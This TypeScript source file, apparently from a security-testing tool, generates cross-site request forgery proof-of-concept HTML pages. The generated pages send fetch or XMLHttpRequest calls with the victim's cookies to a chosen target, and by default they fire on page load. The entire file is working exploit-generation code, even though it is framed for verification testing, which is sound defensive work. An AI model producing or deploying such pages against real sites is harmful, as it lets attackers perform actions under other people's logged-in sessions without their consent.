import { ParsedRequest } from '../../types';
import { PocGeneratorOptions, escapeHtml, escapeJsString } from './types';

/**
 * Generates an AJAX Fetch / XMLHttpRequest based CSRF PoC.
 */
export function generateFetchPoc(
  request: ParsedRequest,
  options: Partial<PocGeneratorOptions> = {}
): string {
  const autoSubmit = options.autoSubmit !== false;
  const delayMs = options.delayMs || 0;
  const buttonText = options.buttonText || 'Trigger Exploit';
  const targetUrl = request.url;
  const method = request.method.toUpperCase();

  const bodyData = request.body || '';
  const isJson = bodyData.startsWith('{') || bodyData.startsWith('[');

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Fetch API CSRF PoC</title>
</head>
<body style="font-family: sans-serif; padding: 40px;">
  <h2>CSRF Verification Test (Fetch API)</h2>
  <p>Target: <code>${escapeHtml(targetUrl)}</code></p>
  <div id="status">Status: Waiting to trigger...</div>
  ${
    !autoSubmit
      ? `<br><button id="triggerBtn" style="padding: 8px 16px;">${escapeHtml(buttonText)}</button>`
      : ''
  }

  <script>
    async function executeCsrf() {
      const statusDiv = document.getElementById('status');
      statusDiv.innerText = 'Status: Dispatched cross-site fetch request...';

      try {
        const response = await fetch(${escapeJsString(targetUrl)}, {
          method: ${escapeJsString(method)},
          mode: 'no-cors', // allows sending request even if server lacks CORS headers
          credentials: 'include', // sends ambient cookies cross-origin
          headers: {
            'Content-Type': ${escapeJsString(isJson ? 'text/plain' : 'application/x-www-form-urlencoded')},
          },
          body: ${escapeJsString(bodyData)},
        });

        statusDiv.innerText = 'Status: Payload sent successfully (Opaque response received)';
      } catch (err) {
        statusDiv.innerText = 'Status: Request failed - ' + err.message;
      }
    }

    ${
      autoSubmit
        ? `window.addEventListener('load', function() {
      setTimeout(executeCsrf, ${delayMs});
    });`
        : `document.getElementById('triggerBtn').addEventListener('click', executeCsrf);`
    }
  </script>
</body>
</html>`;
}

/**
 * Generates an XMLHttpRequest based CSRF PoC with withCredentials = true.
 */
export function generateXhrPoc(
  request: ParsedRequest,
  options: Partial<PocGeneratorOptions> = {}
): string {
  const autoSubmit = options.autoSubmit !== false;
  const delayMs = options.delayMs || 0;
  const targetUrl = request.url;
  const method = request.method.toUpperCase();
  const bodyData = request.body || '';

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>XHR CSRF PoC</title>
</head>
<body>
  <script>
    function triggerXhr() {
      var xhr = new XMLHttpRequest();
      xhr.open(${escapeJsString(method)}, ${escapeJsString(targetUrl)}, true);
      xhr.withCredentials = true; // Include session cookies cross-origin
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send(${escapeJsString(bodyData)});
    }

    ${
      autoSubmit
        ? `window.onload = function() {
      setTimeout(triggerXhr, ${delayMs});
    };`
        : `triggerXhr();`
    }
  </script>
</body>
</html>`;
}
